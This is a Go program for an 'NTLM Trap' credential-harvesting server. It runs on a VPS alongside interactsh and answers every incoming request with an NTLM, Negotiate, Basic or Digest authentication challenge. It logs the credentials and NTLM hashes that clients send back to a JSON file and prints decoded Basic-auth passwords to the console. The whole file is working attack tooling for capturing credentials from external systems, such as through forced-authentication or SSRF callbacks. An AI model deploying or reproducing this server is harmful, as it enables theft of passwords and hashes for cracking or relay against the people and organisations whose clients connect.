package main

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

type CapturedRequest struct {
	Timestamp     string              `json:"timestamp"`
	RemoteAddr    string              `json:"remote_addr"`
	Host          string              `json:"host"`
	Method        string              `json:"method"`
	URI           string              `json:"uri"`
	TLS           bool                `json:"tls"`
	Authorization string              `json:"authorization,omitempty"`
	NTLM          string              `json:"ntlm,omitempty"`
	Negotiate     string              `json:"negotiate,omitempty"`
	UserAgent     string              `json:"user_agent,omitempty"`
	AllHeaders    map[string][]string `json:"all_headers"`
}

var (
	logFile *os.File
	mu      sync.Mutex
	stats   struct {
		total    int64
		external int64
		authHits int64
	}
	vpsIP string
)

func main() {
	outPath := "/root/ntlm_captures.json"
	if len(os.Args) > 1 {
		outPath = os.Args[1]
	}

	vpsIP = "<YOUR_VPS_IP>"
	if v := os.Getenv("VPS_IP"); v != "" {
		vpsIP = v
	}

	var err error
	logFile, err = os.OpenFile(outPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("open log: %s", err)
	}
	defer logFile.Close()

	mux := http.NewServeMux()
	// Proxy interactsh API endpoints to internal port
	mux.HandleFunc("/register", proxyToInteractsh)
	mux.HandleFunc("/deregister", proxyToInteractsh)
	mux.HandleFunc("/poll", proxyToInteractsh)
	mux.HandleFunc("/metrics", proxyToInteractsh)
	// Everything else gets the NTLM challenge
	mux.HandleFunc("/", handler)

	// Start HTTP on port 80
	go func() {
		fmt.Println("[*] NTLM Trap HTTP :80")
		if err := http.ListenAndServe(":80", mux); err != nil {
			log.Fatalf("http: %s", err)
		}
	}()

	// Start HTTPS on port 443 using interactsh's wildcard cert
	certDir := "/root/.local/share/certmagic/certificates/acme-v02.api.letsencrypt.org-directory"
	certFile, keyFile := findCert(certDir)

	if certFile != "" && keyFile != "" {
		fmt.Printf("[*] NTLM Trap HTTPS :443 (cert: %s)\n", filepath.Base(certFile))

		tlsCert, err := tls.LoadX509KeyPair(certFile, keyFile)
		if err != nil {
			log.Fatalf("load cert: %s", err)
		}

		tlsConfig := &tls.Config{
			Certificates: []tls.Certificate{tlsCert},
		}

		server := &http.Server{
			Addr:      ":443",
			Handler:   mux,
			TLSConfig: tlsConfig,
		}

		if err := server.ListenAndServeTLS("", ""); err != nil {
			log.Fatalf("https: %s", err)
		}
	} else {
		fmt.Println("[!] No wildcard cert found — HTTPS disabled")
		fmt.Println("[*] Serving HTTP only on :80")
		select {} // Block forever
	}
}

func handler(w http.ResponseWriter, r *http.Request) {
	mu.Lock()
	stats.total++
	n := stats.total
	mu.Unlock()

	isExternal := !strings.HasPrefix(r.RemoteAddr, vpsIP)

	authHeader := r.Header.Get("Authorization")
	ntlmHeader := ""
	negHeader := ""
	hasAuth := false

	if strings.HasPrefix(authHeader, "NTLM ") {
		ntlmHeader = authHeader
		hasAuth = true
		fmt.Printf("[!!!] NTLM CREDS from %s host=%s\n", r.RemoteAddr, r.Host)
	}
	if strings.HasPrefix(authHeader, "Negotiate ") {
		negHeader = authHeader
		hasAuth = true
		fmt.Printf("[!!!] NEGOTIATE from %s host=%s\n", r.RemoteAddr, r.Host)
	}
	if strings.HasPrefix(authHeader, "Basic ") {
		hasAuth = true
		// Decode base64 credentials
		decoded := decodeBasicAuth(authHeader)
		fmt.Printf("[!!!] BASIC AUTH from %s host=%s creds=%s\n", r.RemoteAddr, r.Host, decoded)
	}
	if strings.HasPrefix(authHeader, "Digest ") {
		hasAuth = true
		fmt.Printf("[!!!] DIGEST AUTH from %s host=%s\n", r.RemoteAddr, r.Host)
	}

	if hasAuth {
		mu.Lock()
		stats.authHits++
		mu.Unlock()
	}
	if isExternal {
		mu.Lock()
		stats.external++
		mu.Unlock()
		proto := "HTTP"
		if r.TLS != nil {
			proto = "HTTPS"
		}
		fmt.Printf("[EXT] %s %s from %s host=%s ua=%s\n",
			proto, r.Method, r.RemoteAddr, r.Host, truncate(r.Header.Get("User-Agent"), 60))
	}

	capture := CapturedRequest{
		Timestamp:     time.Now().UTC().Format(time.RFC3339),
		RemoteAddr:    r.RemoteAddr,
		Host:          r.Host,
		Method:        r.Method,
		URI:           r.RequestURI,
		TLS:           r.TLS != nil,
		Authorization: authHeader,
		NTLM:          ntlmHeader,
		Negotiate:     negHeader,
		UserAgent:     r.Header.Get("User-Agent"),
		AllHeaders:    r.Header,
	}

	data, _ := json.Marshal(capture)
	mu.Lock()
	fmt.Fprintf(logFile, "%s\n", data)
	mu.Unlock()

	if n%5000 == 0 {
		mu.Lock()
		fmt.Printf("[*] %d total | %d external | %d auth\n", stats.total, stats.external, stats.authHits)
		mu.Unlock()
	}

	// Auth mode: NTLM, Basic, or Negotiate (set via AUTH_MODE env)
	authMode := os.Getenv("AUTH_MODE")
	switch authMode {
	case "basic":
		w.Header().Set("WWW-Authenticate", `Basic realm="Restricted"`)
	case "digest":
		w.Header().Set("WWW-Authenticate", `Digest realm="Restricted", nonce="dcd98b", qop="auth"`)
	default: // ntlm
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Add("WWW-Authenticate", "Negotiate")
	}
	w.Header().Set("Content-Type", "text/html")
	w.Header().Set("Connection", "keep-alive")
	w.WriteHeader(http.StatusUnauthorized)
	fmt.Fprint(w, "<!DOCTYPE html><html><body>Authentication Required</body></html>")
}

func findCert(certDir string) (certFile, keyFile string) {
	// Look for wildcard cert files
	entries, err := os.ReadDir(certDir)
	if err != nil {
		return "", ""
	}

	for _, entry := range entries {
		if entry.IsDir() && strings.Contains(entry.Name(), "") {
			dir := filepath.Join(certDir, entry.Name())
			cert := filepath.Join(dir, entry.Name()+".crt")
			key := filepath.Join(dir, entry.Name()+".key")
			if _, err := os.Stat(cert); err == nil {
				if _, err := os.Stat(key); err == nil {
					return cert, key
				}
			}
		}
	}
	return "", ""
}

// proxyToInteractsh forwards API requests to interactsh on internal port.
func proxyToInteractsh(w http.ResponseWriter, r *http.Request) {
	target := "http://127.0.0.1:8080" + r.RequestURI

	proxyReq, err := http.NewRequest(r.Method, target, r.Body)
	if err != nil {
		http.Error(w, "proxy error", 502)
		return
	}
	for k, v := range r.Header {
		proxyReq.Header[k] = v
	}

	resp, err := http.DefaultClient.Do(proxyReq)
	if err != nil {
		http.Error(w, "proxy error", 502)
		return
	}
	defer resp.Body.Close()

	for k, v := range resp.Header {
		for _, val := range v {
			w.Header().Add(k, val)
		}
	}
	w.WriteHeader(resp.StatusCode)
	io.Copy(w, resp.Body)
}

func decodeBasicAuth(header string) string {
	encoded := strings.TrimPrefix(header, "Basic ")
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return "(decode failed: " + encoded + ")"
	}
	return string(decoded)
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n]
}
